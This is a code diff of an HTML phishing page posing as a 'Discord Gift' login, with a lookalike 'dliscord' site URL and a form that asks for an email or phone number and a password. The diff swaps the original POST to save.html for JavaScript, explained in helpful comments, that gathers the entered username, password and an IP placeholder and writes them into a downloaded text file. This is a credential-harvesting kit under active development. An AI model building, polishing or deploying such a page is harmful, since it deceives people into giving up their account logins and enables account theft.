@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html>
   <head>
+    <meta charset="UTF-8">
+    <title>Discord Gift</title>
     <link rel="stylesheet" href="../assest/style.css"/>
     <meta property="og:site_name" content="Discord Gift">
     <meta property="og:url" content="https://dliscord.">
@@ -11,24 +13,66 @@
   </head>
   <body>
     <center>
-    <div class="loginPart">
-      <br/><br/><br/>
-                       We are gonna see if this fuckin works                  please login.
-      <br/><br/><br/>
-      <p class="welcome">Welcome Back!</p>
+      <div class="loginPart">
+        <br/><br/><br/>
+        We are gonna see if this fuckin works — please login.
+        <br/><br/><br/>
+        <p class="welcome">Welcome Back!</p>
         <br/>
         Email or Phone number:
         <br/>
-      <form method="POST" action="save.html">
-        <input type="text" name="user" class="inputs" />
-        <br/>
-        Password:
-        <br/>
-       <input type="password" name="pass" class="inputs"/>
-        <br/><br/>
-        <input type="submit" name="submit" value="Login" class="submit"/>
-      </form>
-    </div>
-  </center>
+        <!-- Note: We remove the "action" and "method" attributes because no backend is used -->
+        <form id="saveForm" onsubmit="handleFormSubmit(event)">
+          <input type="text" name="user" id="user" class="inputs" required />
+          <br/>
+          Password:
+          <br/>
+          <input type="password" name="pass" id="pass" class="inputs" required />
+          <br/><br/>
+          <input type="submit" name="submit" value="Login" class="submit"/>
+        </form>
+      </div>
+    </center>
+    
+    <script>
+      // We cannot truly obtain the client’s IP with client‐side JavaScript,
+      // so we use a placeholder value.
+      const iptoken = "Client_IP";
+
+      // This variable will accumulate the data to be saved.
+      // (If you only expect one submission per page load, this will contain just that entry.)
+      let savedData = "";
+
+      // This function handles the form submission event.
+      function handleFormSubmit(event) {
+        event.preventDefault(); // Stop the form from submitting normally
+
+        // Get the input values from the form
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
+
+        // Append the new entry to savedData in the desired format.
+        // (You can customize the formatting as needed.)
+        savedData += " - IP: " + iptoken + "   Username: " + user + "   Password: " + pass + "\n\n";
+
+        // Optionally clear the form (if you expect multiple entries)
+        document.getElementById('saveForm').reset();
+
+        // Create a Blob from the accumulated data and trigger an automatic download.
+        const blob = new Blob([savedData], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = "savetext.txt";
+        
+        // Append the anchor to the document, trigger a click to start download, then remove it.
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+
+        // Clean up the object URL.
+        URL.revokeObjectURL(url);
+      }
+    </script>
   </body>
 </html>
